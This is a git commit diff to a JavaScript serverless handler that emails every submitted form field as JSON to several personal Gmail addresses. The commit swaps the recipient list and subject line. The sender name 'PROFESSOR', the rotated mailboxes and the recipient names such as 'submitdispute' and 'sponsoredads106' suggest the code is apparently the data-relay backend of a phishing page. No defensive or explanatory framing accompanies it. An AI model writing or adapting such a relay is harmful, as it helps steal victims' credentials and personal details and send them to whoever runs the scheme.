312b123cf9f136ba4627d44c52aea38fd44da664
zm9807350 <zm9807350@gmail.com>
2026-01-23 11:21:35 +0500

    Update and rename asif.js to waqar.js

--- waqar.js
+++ waqar.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com",
-      subject: "PROFESSOR",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,sponsoredads106@gmail.com",
+      subject: "Waqar",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
